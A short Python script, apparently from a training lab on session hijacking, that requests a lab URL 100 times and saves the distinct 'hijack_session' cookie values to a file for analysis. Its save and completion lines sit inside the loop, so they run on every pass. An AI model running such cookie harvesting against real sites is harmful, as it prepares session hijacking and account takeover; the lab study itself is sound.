import requests
url = "http://web0x01.hbtn/a1/hijack_session"
cookie_file = "cookie_list.txt"
cookies_seen = []
print("[+] Collecting 100 session cookies...") 
for i in range(100):
    s = requests.Session()
    r = s.get(url)
    c = s.cookies.get("hijack_session")
    if c and c not in cookies_seen:
        cookies_seen.append(c)
        print(f"{i+1:03}: {c}")
    with open(cookie_file, "w") as f:
      for c in cookies_seen:
        f.write(c + "\n")
    print(f"[+] Done. Saved to {cookie_file}")
